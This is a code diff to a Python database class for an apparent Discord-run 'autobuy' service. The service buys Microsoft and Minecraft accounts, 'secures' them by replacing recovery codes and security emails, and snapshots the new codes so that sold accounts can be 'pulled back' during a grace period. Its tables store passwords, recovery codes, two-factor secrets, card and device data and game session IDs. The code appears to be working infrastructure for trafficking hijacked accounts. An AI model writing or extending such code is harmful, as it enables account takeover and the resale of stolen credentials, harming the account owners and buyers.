@@ -139,6 +139,12 @@ class DBConnection:
             "ALTER TABLE autobuy_credits ADD COLUMN last_checked_at TIMESTAMP",
             "ALTER TABLE autobuy_credits ADD COLUMN next_check_at TIMESTAMP",
             "ALTER TABLE autobuy_credits ADD COLUMN next_lock_check_at TIMESTAMP",
+            # Snapshot of NEW recovery code at sell time (never seller-submitted RC)
+            "ALTER TABLE autobuy_credits ADD COLUMN ms_recovery_code TEXT",
+            "ALTER TABLE autobuy_credits ADD COLUMN ms_security_email TEXT",
+            "ALTER TABLE secured_accounts ADD COLUMN validation_status TEXT",
+            "ALTER TABLE secured_accounts ADD COLUMN validation_detail TEXT",
+            "ALTER TABLE secured_accounts ADD COLUMN validated_at TIMESTAMP",
         ):
             try:
                 self.cursor.execute(stmt)
@@ -154,6 +160,44 @@ class DBConnection:
                     next_lock_check_at = COALESCE(next_lock_check_at, CURRENT_TIMESTAMP)
                 WHERE remaining_usd > 0
                   AND COALESCE(status, 'holding') NOT IN ('voided', 'cleared')
+            """)
+            self.conn.commit()
+        except Exception:
+            pass
+        # Backfill pullback snapshots from secured_accounts via sell.account_id only
+        # (never guess by email — primary may be sunny@ while credit.email is original).
+        try:
+            self.cursor.execute("""
+                UPDATE autobuy_credits
+                SET ms_recovery_code = (
+                        SELECT sa.ms_recovery_code
+                        FROM autobuy_sells s
+                        JOIN secured_accounts sa ON sa.account_id = s.account_id
+                        WHERE s.credit_id = autobuy_credits.id
+                          AND s.success = 1
+                          AND s.account_id IS NOT NULL
+                          AND s.account_id != ''
+                        LIMIT 1
+                    ),
+                    ms_security_email = COALESCE(
+                        autobuy_credits.ms_security_email,
+                        (
+                            SELECT sa.ms_security_email
+                            FROM autobuy_sells s
+                            JOIN secured_accounts sa ON sa.account_id = s.account_id
+                            WHERE s.credit_id = autobuy_credits.id
+                              AND s.success = 1
+                              AND s.account_id IS NOT NULL
+                              AND s.account_id != ''
+                            LIMIT 1
+                        )
+                    )
+                WHERE COALESCE(status, 'holding') = 'holding'
+                  AND remaining_usd > 0
+                  AND (
+                        ms_recovery_code IS NULL
+                     OR TRIM(ms_recovery_code) = ''
+                  )
             """)
             self.conn.commit()
         except Exception:
@@ -302,7 +346,8 @@ class DBConnection:
     def get_all_secured_accounts(self) -> list:
         rows = self.cursor.execute("""
             SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
-                   mc_name, mc_method, mc_gamertag, mc_capes, secured_at
+                   mc_name, mc_method, mc_gamertag, mc_capes, secured_at,
+                   validation_status, validation_detail, validated_at
             FROM secured_accounts
             ORDER BY secured_at DESC
             LIMIT 100
@@ -310,6 +355,7 @@ class DBConnection:
         keys = [
             "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
             "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
+            "validation_status", "validation_detail", "validated_at",
         ]
         return [dict(zip(keys, row)) for row in rows]
 
@@ -392,7 +438,8 @@ class DBConnection:
                    ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                    ms_family, ms_devices, ms_cards,
                    ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
-                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at
+                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at,
+                   validation_status, validation_detail, validated_at
             FROM `secured_accounts` WHERE account_id = ?
         """, (account_id,)).fetchone()
 
@@ -404,7 +451,8 @@ class DBConnection:
             "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
             "ms_family", "ms_devices", "ms_cards",
             "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
-            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at"
+            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at",
+            "validation_status", "validation_detail", "validated_at",
         ]
         data = dict(zip(keys, row))
         json_fields = [
@@ -424,6 +472,27 @@ class DBConnection:
                     pass
 
         return data
+
+    def set_account_validation(
+        self,
+        account_id: str,
+        status: str,
+        detail: str | None = None,
+    ) -> bool:
+        if not self.is_valid_account_id(account_id):
+            return False
+        self.cursor.execute(
+            """
+            UPDATE secured_accounts
+            SET validation_status = ?,
+                validation_detail = ?,
+                validated_at = CURRENT_TIMESTAMP
+            WHERE account_id = ?
+            """,
+            (status, detail, account_id),
+        )
+        self.conn.commit()
+        return True
 
     # Shared Links
     def create_share_link(self, link_id: str, account_id: str, password: str | None = None) -> None:
@@ -498,18 +567,50 @@ class DBConnection:
         email: str,
         next_check_at: str | None = None,
         next_lock_check_at: str | None = None,
+        ms_recovery_code: str | None = None,
+        ms_security_email: str | None = None,
     ) -> int:
         self.cursor.execute("""
             INSERT INTO autobuy_credits
                 (discord_id, amount_usd, remaining_usd, available_at, source, email,
-                 status, next_check_at, next_lock_check_at)
+                 status, next_check_at, next_lock_check_at,
+                 ms_recovery_code, ms_security_email)
             VALUES (?, ?, ?, ?, ?, ?, 'holding',
                     COALESCE(?, CURRENT_TIMESTAMP),
-                    COALESCE(?, CURRENT_TIMESTAMP))
+                    COALESCE(?, CURRENT_TIMESTAMP),
+                    ?, ?)
         """, (
             discord_id, amount_usd, amount_usd, available_at, source, email,
             next_check_at, next_lock_check_at,
+            (ms_recovery_code or "").strip() or None,
+            (ms_security_email or "").strip() or None,
         ))
+        self.conn.commit()
+        return int(self.cursor.lastrowid)
+
+    def autobuy_add_manual_credit(
+        self,
+        discord_id: int,
+        amount_usd: float,
+        *,
+        note: str | None = None,
+        added_by: int | None = None,
+    ) -> int:
+        """Owner-granted credit — immediately cleared / withdrawable."""
+        amount = round(float(amount_usd), 8)
+        if amount <= 0:
+            raise ValueError("amount must be positive")
+        label = (note or "manual").strip()[:200] or "manual"
+        if added_by:
+            email = f"manual:{added_by}:{label}"
+        else:
+            email = f"manual:{label}"
+        self.cursor.execute("""
+            INSERT INTO autobuy_credits
+                (discord_id, amount_usd, remaining_usd, available_at, source, email,
+                 status, next_check_at, next_lock_check_at)
+            VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'manual', ?, 'cleared', NULL, NULL)
+        """, (discord_id, amount, amount, email[:240]))
         self.conn.commit()
         return int(self.cursor.lastrowid)
 
@@ -666,7 +767,14 @@ class DBConnection:
         self.conn.commit()
 
     def autobuy_credits_due_for_check(self, limit: int = 25) -> list[dict]:
-        """Holding credits due for security-email and/or lock check."""
+        """Holding credits due for pullback/lock (still in grace) or clear (grace ended).
+
+        Recovery code for pullback:
+          1) ``c.ms_recovery_code`` — snapshot of the NEW code at sell time
+          2) else ``sa.ms_recovery_code`` only when joined by ``s.account_id``
+        Never use seller-submitted RCs; never guess via email-only joins (primary
+        may be sunny@ while credit.email is the original).
+        """
         rows = self.cursor.execute("""
             SELECT
                 c.id,
@@ -678,25 +786,25 @@ class DBConnection:
                 c.status,
                 c.next_check_at,
                 c.next_lock_check_at,
+                c.ms_recovery_code AS credit_ms_recovery_code,
+                c.ms_security_email AS credit_ms_security_email,
                 s.account_id AS sell_account_id,
                 sa.account_id,
                 sa.ms_email,
-                sa.ms_password,
-                sa.ms_security_email
+                sa.ms_security_email,
+                sa.ms_recovery_code
             FROM autobuy_credits c
             LEFT JOIN autobuy_sells s
                 ON s.credit_id = c.id AND s.success = 1
-            LEFT JOIN secured_accounts sa ON (
-                (s.account_id IS NOT NULL AND sa.account_id = s.account_id)
-                OR (
-                    (s.account_id IS NULL OR s.account_id = '')
-                    AND LOWER(sa.ms_email) = LOWER(c.email)
-                )
-            )
+            LEFT JOIN secured_accounts sa
+                ON s.account_id IS NOT NULL
+               AND s.account_id != ''
+               AND sa.account_id = s.account_id
             WHERE COALESCE(c.status, 'holding') = 'holding'
               AND c.remaining_usd > 0
               AND (
-                    c.next_check_at IS NULL
+                    c.available_at <= CURRENT_TIMESTAMP
+                 OR c.next_check_at IS NULL
                  OR c.next_check_at <= CURRENT_TIMESTAMP
                  OR c.next_lock_check_at IS NULL
                  OR c.next_lock_check_at <= CURRENT_TIMESTAMP
@@ -704,13 +812,36 @@ class DBConnection:
             ORDER BY COALESCE(c.next_check_at, c.next_lock_check_at, c.created_at) ASC, c.id ASC
             LIMIT ?
         """, (limit,)).fetchall()
+        # Intentionally omit ms_password — hold checks never password-verify (locks/rate-limits).
         keys = [
             "id", "discord_id", "email", "amount_usd", "remaining_usd",
             "available_at", "status", "next_check_at", "next_lock_check_at",
-            "sell_account_id", "account_id", "ms_email", "ms_password",
-            "ms_security_email",
+            "credit_ms_recovery_code", "credit_ms_security_email",
+            "sell_account_id", "account_id", "ms_email",
+            "ms_security_email", "ms_recovery_code",
         ]
-        return [dict(zip(keys, row)) for row in rows]
+        out = []
+        for row in rows:
+            item = dict(zip(keys, row))
+            # Prefer sell-time snapshot (post-RecoverUser / post-secure NEW code).
+            snap = (item.get("credit_ms_recovery_code") or "").strip()
+            joined = (item.get("ms_recovery_code") or "").strip()
+            if snap:
+                item["pullback_recovery_code"] = snap
+                item["pullback_rc_source"] = "credit_snapshot"
+            elif item.get("sell_account_id") and joined:
+                item["pullback_recovery_code"] = joined
+                item["pullback_rc_source"] = "secured_by_account_id"
+            else:
+                item["pullback_recovery_code"] = ""
+                item["pullback_rc_source"] = "none"
+            # Security email: snapshot first, then secured row
+            item["pullback_security_email"] = (
+                (item.get("credit_ms_security_email") or "").strip()
+                or (item.get("ms_security_email") or "").strip()
+            )
+            out.append(item)
+        return out
 
     def autobuy_mark_credit_checked(
         self,
@@ -848,7 +979,10 @@ class DBConnection:
                 sa.mc_method,
                 sa.mc_gamertag,
                 sa.mc_capes,
-                sa.secured_at
+                sa.secured_at,
+                sa.validation_status,
+                sa.validation_detail,
+                sa.validated_at
             FROM autobuy_sells abs
             LEFT JOIN autobuy_credits ac ON ac.id = abs.credit_id
             LEFT JOIN autobuy_users au ON au.discord_id = abs.discord_id
@@ -870,6 +1004,7 @@ class DBConnection:
             "account_id", "ms_email", "ms_security_email", "ms_password",
             "ms_recovery_code", "ms_auth_secret",
             "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
+            "validation_status", "validation_detail", "validated_at",
         ]
         seen: set[str] = set()
         out: list[dict] = []
